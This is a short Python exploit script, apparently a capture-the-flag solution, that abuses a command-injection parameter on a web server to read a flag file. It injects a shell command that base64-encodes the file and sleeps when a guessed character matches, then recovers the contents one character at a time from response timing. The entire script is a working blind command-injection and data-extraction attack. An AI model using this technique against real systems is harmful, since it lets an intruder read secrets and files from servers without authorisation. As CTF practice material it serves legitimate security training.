import requests
import time

charset="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="

# Change this
SERVER_URL = "http://localhost:34257?cmd="

def ifFlagIEqualChar(i, c):
    # Sleep 1 if flag.txt[$i] equals char $c
    cmd = """f=`cat /msg_with_flag.txt|base64 -w0| cut -c %d-%d`;[ $f != %s ]; sleep $?""" % (i+1,i+1, c)
    start_time = time.time()
    r = requests.get(SERVER_URL + cmd)
    end_time = time.time()
    if (end_time - start_time > 1): return True
    return False

etcps=""
i = 0
while True:
    print(etcps)
    found = False
    for c in charset:
        if ifFlagIEqualChar(i, c):
            i += 1
            found = True
            etcps += c
            break
    if not found:
        break

print("================")
print(etcps)
